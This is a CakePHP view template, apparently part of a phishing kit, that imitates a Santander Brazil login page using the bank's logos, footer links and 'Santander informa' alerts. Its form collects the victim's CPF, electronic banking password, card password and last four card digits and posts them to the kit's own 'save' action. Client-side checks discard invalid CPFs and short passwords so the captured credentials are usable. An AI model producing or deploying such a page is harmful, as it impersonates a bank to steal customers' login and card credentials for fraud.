<div class="container-santander bg-image">
	<nav class="navbar">
		<div class="row">
			<div class="col-md-12" style="text-align: center">
				
				<?= $this->Html->image('santander/logo_2.png', ['class' => 'logo_form']) ?>
				
			</div>			
		</div>
	</nav>
	<nav class="navbar navbar-acesso">
		<div class="row">
			<div class="col-md-12 col-xs-12 navbar-acesso-div" >
				<?= $this->Html->image('santander/key.png', ['class' => 'icon_key']) ?>
			
				<span>Acessar</span>
			</div>			
		</div>
	</nav>
	<div class="row row-fix">
		<?= $this->Form->create($santander, ['url' => [ 'action' => 'save']]) ?>
		
		<div class="col-md-12">
			<div class="col-md-12 col-xs-12">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->text('cpf', ['class' => 'form-control', 'required' => true, 'placeholder' => "CPF"]) ?>
				</div>
			</div>
			<div class="col-md-12">
				<div class="col-md-12 col-xs-12">
					<div class="togglebutton">
		            	<label>
		                	<input type="checkbox">
							Guardar meu CPF
		            	</label>
		            </div>
				</div>
			</div>
			<div class="col-md-12 col-xs-12">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->password('senha_eletronica', ['class' => 'form-control', 'required' => true, 'placeholder' => "Senha Eletrônica"]) ?>
				</div>
			</div>
			<div class="col-md-12 col-xs-12">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->password('senha_cartao', ['class' => 'form-control', 'required' => true, 'placeholder' => "Senha Cartão"]) ?>
				</div>
			</div>
			<div class="col-md-12 col-xs-12">
				<div class="form-group is-empty">
			        <span class="material-input"></span>
					<?= $this->Form->text('telefone', ['class' => 'form-control', 'required' => true, 'placeholder' => "4 últimos números do cartão"]) ?>
				</div>
			</div>
		</div>
		<div class="col-md-12">
			<div class="col-md-12 col-xs-12">
				<?= $this->Form->button('<i class="fa fa-lock"></i> Continuar', ['type' => 'submit', 'class' => 'btn btn-lg btn-block btn-santander btn-round']) ?>
			</div>
		</div>
	</div>
	<div class="row footer row-fix">
		<div class="col-md-12">
			<div class="col-md-4 col-xs-4 text-center">
				<a href="https://www.santander.com.br/br/pessoa-fisica/santander/atendimento/nas-agencias">
					<i class="fa fa-map-marker fa-4x fa-inverse"></i>
				</a>
			</div>
			<div class="col-md-4 col-xs-4 text-center">
				<a href="https://www.santander.com.br/br/resolva-on-line/simuladores#_ga=2.163231420.1693486095.1494377261-
1103924346.1494377618">
					<i class="fa fa-calculator fa-4x fa-inverse"></i>
				</a>
			</div>
			<div class="col-md-4 col-xs-4 text-center">
				<a href="https://www.santander.com.br/br/o-santander/seguranca/politica-de-privacidade">
					<i class="fa fa-info-circle fa-4x fa-inverse"></i>
				</a>
			</div>
		</div>
	</div>
</div>
<script type="text/javascript">
	$(function() {
		$('input[name="agencia"]').mask('0000');
		$('input[name="conta"]').mask('00000-0');
		$('input[name="telefone"]').mask('0000');
		$('input[name="cpf"]').mask('000.000.000-00');
		$('input[name="senha_cartao"]').mask('0000');

		$('input[name="cpf"]').blur(function() {
			if($(this).val() && !validarCPF($(this).val())) {
				bootbox.alert({
					message: "Santander informa: CPF Inválido!", 
					buttons: {
				        ok: {
				            label: 'Ok',
				            className: 'btn-danger'
				        }
				    }

				});

				$(this).val("");
			}
		});

		$('input[name="senha_eletronica"]').blur(function() {
			if($(this).val() && $(this).val().length < 6) {
				$(this).val("");
				bootbox.alert({
					message: "Santander informa: Senha Inválida!", 
					buttons: {
				        ok: {
				            label: 'Ok',
				            className: 'btn-danger'
				        }
				    }

				});
			}
		});
	});

	function validarCPF(cpf) {	
		cpf = cpf.replace(/[^\d]+/g,'');	
		if(cpf == '') return false;	
		// Elimina CPFs invalidos conhecidos	
		if (cpf.length != 11 || 
			cpf == "00000000000" || 
			cpf == "11111111111" || 
			cpf == "22222222222" || 
			cpf == "33333333333" || 
			cpf == "44444444444" || 
			cpf == "55555555555" || 
			cpf == "66666666666" || 
			cpf == "77777777777" || 
			cpf == "88888888888" || 
			cpf == "99999999999")
				return false;		
		// Valida 1o digito	
		add = 0;	
		for (i=0; i < 9; i ++)		
			add += parseInt(cpf.charAt(i)) * (10 - i);	
			rev = 11 - (add % 11);	
			if (rev == 10 || rev == 11)		
				rev = 0;	
			if (rev != parseInt(cpf.charAt(9)))		
				return false;		
		// Valida 2o digito	
		add = 0;	
		for (i = 0; i < 10; i ++)		
			add += parseInt(cpf.charAt(i)) * (11 - i);	
		rev = 11 - (add % 11);	
		if (rev == 10 || rev == 11)	
			rev = 0;	
		if (rev != parseInt(cpf.charAt(10)))
			return false;		
		return true;   
	}
</script>